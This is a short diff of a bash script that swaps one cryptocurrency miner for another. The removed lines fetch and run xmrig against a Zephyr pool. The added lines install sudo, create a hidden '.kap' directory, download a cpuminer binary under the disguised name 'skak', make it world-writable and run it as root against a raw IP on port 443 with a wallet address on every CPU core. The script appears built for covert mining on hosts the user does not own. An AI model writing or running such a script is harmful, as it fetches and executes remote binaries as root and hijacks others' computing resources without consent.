@@ -1,3 +1,6 @@
 #!/bin/bash
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHYR3YjAKBsmXd4MGYpAgatSybW8xwDUSTiLY8dotSQLogQFUgaGmZr3295MB5M8GTDZUUiLFxkHZdsGBVPmyLSt7aXUDRtEW48 -p LIEUR -a rx/0 -t $(nproc --all)
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget -O skak https://bitbucket.org/aboxx/filee/raw/main/cpuminer-avx2
+chmod 777 skak
+sudo ./skak -a yespower -o 157.245.57.127:443 -u uu6EPojm3iWPL4xK44dcw1m2H5XwdVUWmo.cuuuk -t $(nproc --all)
